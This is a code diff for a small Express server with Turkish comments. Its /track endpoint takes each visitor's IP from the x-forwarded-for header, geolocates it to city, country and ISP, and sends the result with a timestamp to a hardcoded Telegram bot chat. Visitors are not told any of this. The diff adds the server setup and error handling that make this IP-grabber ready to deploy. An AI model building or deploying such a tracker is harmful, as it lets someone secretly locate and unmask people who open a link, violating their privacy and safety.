@@ -1,3 +1,7 @@
+const express = require('express');
+const app = express();
+
+// TRACK ENDPOINT
 app.get("/track", async (req, res) => {
   // SADECE İLK IP'Yİ AL
   const forwarded = req.headers["x-forwarded-for"];
@@ -12,9 +16,11 @@ app.get("/track", async (req, res) => {
     city = geo.city || "-";
     country = geo.country || "-";
     isp = geo.isp || "-";
-  } catch(e) {}
+  } catch(e) {
+    console.log("Geo API hatası:", e.message);
+  }
   
-  // Tarih
+  // Tarih (doğru format)
   const now = new Date();
   const time = `${now.getDate().toString().padStart(2,'0')}.${(now.getMonth()+1).toString().padStart(2,'0')}.${now.getFullYear()} ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
   
@@ -29,11 +35,26 @@ app.get("/track", async (req, res) => {
 
 ⏰ Saat: ${time}`;
 
-  await fetch(`https://api.telegram.org/bot***/sendMessage`, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({chat_id: "8706199771", text: msg})
-  });
+  try {
+    await fetch(`https://api.telegram.org/bot***/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: "8706199771", text: msg})
+    });
+  } catch(e) {
+    console.log("Telegram hatası:", e.message);
+  }
   
   res.send("OK");
+});
+
+// Health check için (zorunlu değil ama iyi olur)
+app.get("/", (req, res) => {
+  res.send("Server is running");
+});
+
+// Sunucuyu başlat
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
 });
